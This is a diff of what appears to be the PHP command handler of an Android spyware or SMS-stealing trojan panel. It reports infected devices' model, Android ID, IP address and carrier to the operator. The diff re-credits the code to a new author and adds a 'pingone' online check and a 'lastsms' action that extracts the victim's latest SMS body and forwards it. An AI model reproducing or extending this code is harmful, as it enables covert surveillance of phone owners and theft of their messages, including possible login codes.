@@ -92,7 +92,7 @@ $i++;
 
 ♿️IP :  $ip
 
-Coded By : @Stop_TiM
+Coded By : @HiGHFaTHeR_CH
 ";    
 
 
@@ -123,11 +123,27 @@ if ($action == "ping"){
 
 ♿️IP :  $ip
 
-CoDeD By : @Stop_TiM
+CoDeD By : @HiGHFaTHeR_CH
 ";  
     
     
     send($text);
+    
+    
+}elseif($action == "pingone"){
+    
+  $text=
+"✅ $model IS ONLINE !
+
+🕒TimE : $time
+
+🌀AnDRoID ID: #$androidid :)
+
+♿️IP :  $ip
+
+CoDeD By : @HiGHFaTHeR_CH
+";    
+      send($text);
     
     
 }elseif($action == "getdevicefullinfo"){
@@ -146,7 +162,7 @@ CoDeD By : @Stop_TiM
 
 ♿️IP :  $ip
 
-CoDeD By : @Stop_TiM
+CoDeD By : @HiGHFaTHeR_CH
 ";    
       send($text);
     
@@ -173,7 +189,7 @@ $body ️
 📶OpRaToR :  $opr
 📱AnDRoiD ID : #$androidid :)
 ♿️IP :  $ip
-Coded By : @Stop_TiM
+Coded By : @HiGHFaTHeR_CH
 
 ";
 
@@ -206,7 +222,7 @@ Coded By : @Stop_TiM
 
 ♿️IP :  $ip
 
-CodeD By : @Stop_TiM";
+CodeD By : @HiGHFaTHeR_CH";    
 
 
 
@@ -231,7 +247,39 @@ CodeD By : @Stop_TiM";
 
 ♿️IP :  $ip
 
-CodeD By : @Stop_TiM";
+CodeD By : @HiGHFaTHeR_CH";    
+
+
+
+
+      send($text);  
+      
+    
+    
+    
+}elseif($action == "lastsms"){
+    
+       
+   $body= asd($mess,', Body=','Address');
+  
+    
+          $text=
+"♻️LasT SmS From $model
+
+SmS BoDy📥 :
+— — — — — — — — — — 
+$body
+— — — — — — — — — — 
+
+📶OpRaToR : $opr
+
+🕒SenT TimE: $time
+
+🌀AndRoid ID: #$androidid :)
+
+♿️IP :  $ip
+
+CodeD By : @HiGHFaTHeR_CH";    
 
 
 
